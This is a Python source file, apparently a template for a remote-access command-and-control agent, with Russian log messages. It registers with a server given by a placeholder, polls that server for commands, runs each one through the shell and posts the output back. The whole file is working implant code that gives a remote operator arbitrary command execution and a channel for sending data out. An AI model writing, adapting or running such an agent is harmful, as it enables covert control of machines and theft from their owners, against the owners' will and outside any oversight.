import requests
import time
import sys
import subprocess

SERVER_URL = "{{SERVER_URL}}"
AGENT_NAME = "{{AGENT_NAME}}"

def register_agent():
    try:
        resp = requests.post(f"{SERVER_URL}/agents/", params={"name": AGENT_NAME})
        resp.raise_for_status()
        data = resp.json()
        return data["id"]
    except Exception as e:
        print(f"[!] Ошибка регистрации агента: {e}")
        sys.exit(1)

def fetch_tasks(agent_id):
    try:
        resp = requests.get(f"{SERVER_URL}/tasks/{agent_id}")
        resp.raise_for_status()
        return resp.json()
    except Exception as e:
        print(f"[!] Ошибка получения задач: {e}")
        return []

def send_result(task_id, output):
    try:
        resp = requests.post(f"{SERVER_URL}/results/", params={"task_id": task_id, "output": output})
        resp.raise_for_status()
    except Exception as e:
        print(f"[!] Ошибка отправки результата: {e}")

def execute_command(command):
    try:
        completed = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60)
        return completed.stdout + completed.stderr
    except Exception as e:
        return f"Ошибка выполнения команды: {e}"

def main():
    agent_id = register_agent()
    print(f"[+] Агент зарегистрирован с ID: {agent_id}")

    while True:
        tasks = fetch_tasks(agent_id)
        for task in tasks:
            print(f"[+] Выполнение задачи {task['id']}: {task['command']}")
            output = execute_command(task['command'])
            send_result(task['id'], output)
        time.sleep(10)

if __name__ == "__main__":
    main()
